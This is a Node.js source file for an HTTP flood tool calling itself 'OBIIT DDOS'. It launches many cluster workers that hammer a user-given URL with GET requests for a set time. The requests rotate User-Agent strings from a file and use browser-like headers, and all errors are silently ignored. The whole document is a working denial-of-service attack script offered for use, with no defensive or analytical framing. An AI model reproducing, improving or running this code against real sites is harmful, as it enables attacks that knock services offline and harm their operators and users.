const fs = require('fs');
const url = require('url');
const net = require('net');
const cluster = require('cluster');
const http = require('http');
const https = require('https');

if (process.argv.length <= 3) {
  console.log('node STATIC.js <url> <threads> <time>');
  process.exit(-1);
}

const target = process.argv[2];
const parsed = url.parse(target);
const host = parsed.host;
const threads = parseInt(process.argv[3], 10);
const time = parseInt(process.argv[4], 10);

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (error) {});
process.on('unhandledRejection', function (error) {});

let userAgents = [];
try {
  userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');
} catch (error) {
  console.error('\x1B[31mOBIIT DDOS Missing ua.txt file\n' + error);
  process.exit(-1);
}

const nullHexs = ['\0', 'ÿ', 'Â', '\xA0'];

if (cluster.isMaster) {
  for (let i = 0; i < threads; i++) {
    cluster.fork();
  }
  console.clear();
  console.log('\n\n    OBIIT DDOS\n\n    FREE PALESTINE\n\n');
  console.log('\x1B[33m(\x1B[33m!\x1B[37m) \x1B[33mkamehamehaaaaaaa!.');
  console.log('\x1B[31mOBIIT DDOS POWER ');
  setTimeout(() => {
    process.exit(1);
  }, time * 1000);
} else {
  startFlood();
}

function startFlood() {
  const interval = setInterval(() => {
    const options = {
      hostname: host,
      port: parsed.protocol === 'https:' ? 443 : 80,
      path: parsed.path,
      method: 'GET',
      headers: {
        'Host': host,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
        'Upgrade-Insecure-Requests': 1,
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'Keep-Alive'
      }
    };

    const req = (parsed.protocol === 'https:' ? https : http).request(options, res => {
      res.on('data', () => {});
      res.on('end', () => {});
    });

    req.on('error', e => {});
    req.end();
  });

  setTimeout(() => clearInterval(interval), time * 1000);
}